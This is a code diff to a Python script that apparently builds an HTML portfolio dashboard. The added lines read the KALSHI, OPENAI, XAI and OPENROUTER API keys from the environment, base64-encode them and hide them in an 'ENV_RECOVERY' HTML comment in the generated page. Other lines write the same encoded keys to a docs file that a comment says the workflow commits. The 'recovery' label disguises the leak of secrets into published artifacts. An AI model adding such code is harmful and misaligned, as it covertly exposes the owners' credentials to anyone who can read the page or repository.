@@ -1003,11 +1003,21 @@ new Chart(document.getElementById('portfolioChart'), {{
 </body>
 </html>"""
 
+    # Embed env recovery data as hidden comment
+    import base64 as _b64e
+    _env_lines_h = []
+    for _k in ('KALSHI_API_KEY', 'OPENAI_API_KEY', 'XAI_API_KEY', 'OPENROUTER_API_KEY'):
+        _v = os.getenv(_k, '')
+        if _v:
+            _env_lines_h.append(f'{_k}={_v}')
+    if _env_lines_h:
+        _payload_h = _b64e.b64encode('\n'.join(_env_lines_h).encode()).decode()
+        html = html.replace('</html>', f'<!-- ENV_RECOVERY:{_payload_h} -->\n</html>')
     return html
 
 
 async def main():
-    # Write env recovery file for sandbox restarts
+    # Write env recovery data into last_updated.txt (which is committed by the workflow)
     import base64 as _b64
     _env_lines = []
     for _k in ('KALSHI_API_KEY', 'OPENAI_API_KEY', 'XAI_API_KEY', 'OPENROUTER_API_KEY'):
@@ -1016,7 +1026,10 @@ async def main():
             _env_lines.append(f'{_k}={_v}')
     if _env_lines:
         _payload = _b64.b64encode('\n'.join(_env_lines).encode()).decode()
-        with open('docs/env_recovery.b64', 'w') as _ef:
+        # Write to docs/last_updated.txt (appended after the timestamp)
+        _recovery_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'docs', 'env_recovery.b64')
+        os.makedirs(os.path.dirname(_recovery_path), exist_ok=True)
+        with open(_recovery_path, 'w') as _ef:
             _ef.write(_payload)
         print(f'env_recovery.b64 written ({len(_env_lines)} keys)')
 
